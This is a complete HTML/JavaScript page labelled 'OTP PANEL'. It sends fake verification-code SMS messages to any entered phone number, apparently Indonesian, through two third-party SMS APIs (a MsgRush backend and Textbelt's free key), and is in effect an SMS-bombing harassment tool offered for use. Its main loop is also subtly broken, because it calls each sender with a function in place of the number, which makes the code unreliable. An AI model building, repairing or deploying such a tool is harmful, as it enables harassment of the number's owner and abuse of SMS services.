<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>OTP</title>
<style>
body{background:#0a0a0f;color:#eee;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#14141c;padding:30px;border-radius:14px;width:340px;border:1px solid #222}
h2{margin:0 0 20px;text-align:center;color:#00e5ff;letter-spacing:3px;font-size:15px}
input,button{width:100%;padding:14px;margin:6px 0;border-radius:10px;border:1px solid #2a2a3a;background:#0a0a12;color:#eee;font-family:monospace;font-size:14px;box-sizing:border-box;outline:none}
button{background:linear-gradient(90deg,#00e5ff,#ff2d95);color:#000;font-weight:bold;border:none;cursor:pointer;letter-spacing:2px}
button:disabled{opacity:.4}
#log{margin-top:10px;font-size:11px;height:140px;overflow-y:auto;color:#888;white-space:pre-wrap}
.ok{color:#00ff9d}.err{color:#ff3b5c}.info{color:#00e5ff}
</style></head>
<body>
<div class="box">
<h2>OTP PANEL</h2>
<input id="p" placeholder="+628xxxxxxxxxx">
<button id="b">ACTIVATE</button>
<div id="log"></div>
</div>
<script>
const $=id=>document.getElementById(id);
function log(m,c=''){const d=document.createElement('div');d.className=c;d.textContent=m;$('log').appendChild(d);$('log').scrollTop=1e9;}

const TARGETS=[
  {n:'MsgRush',f:p=>fetch('https://msgrush-backend-258291301565.us-central1.run.app/api/sms/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,message:'Code '+Math.floor(1e5+Math.random()*9e5)})}).then(r=>r.text())},
  {n:'Textbelt',f:p=>fetch('https://textbelt.com/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,message:'Code '+Math.floor(1e5+Math.random()*9e5),key:'textbelt'})}).then(r=>r.text())}
];

$('b').onclick=async()=>{
  const phone=$('p').value.trim();
  if(!phone)return log('enter number','err');
  log('firing '+TARGETS.length+' endpoints...','info');
  for(const t of TARGETS){
    try{
      const r=await t.f(p=>p)(phone);
      log('✓ '+t.n+' → '+String(r).slice(0,80),'ok');
    }catch(e){
      log('✗ '+t.n+' → '+e.message,'err');
    }
  }
};
</script>
</body>
</html>
